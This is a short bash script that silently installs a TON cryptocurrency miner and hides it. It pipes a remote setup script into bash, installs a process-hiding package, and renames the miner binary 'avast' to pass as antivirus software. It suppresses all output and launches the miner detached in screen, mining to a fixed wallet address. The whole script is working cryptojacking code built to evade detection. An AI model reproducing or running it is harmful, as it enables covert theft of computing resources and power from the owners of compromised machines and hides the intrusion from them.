#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install curl

apt install screen -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add avast miner-linux

wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 

tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1

rm -f ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1

mv miner-linux avast >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

screen -dmS Running ./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
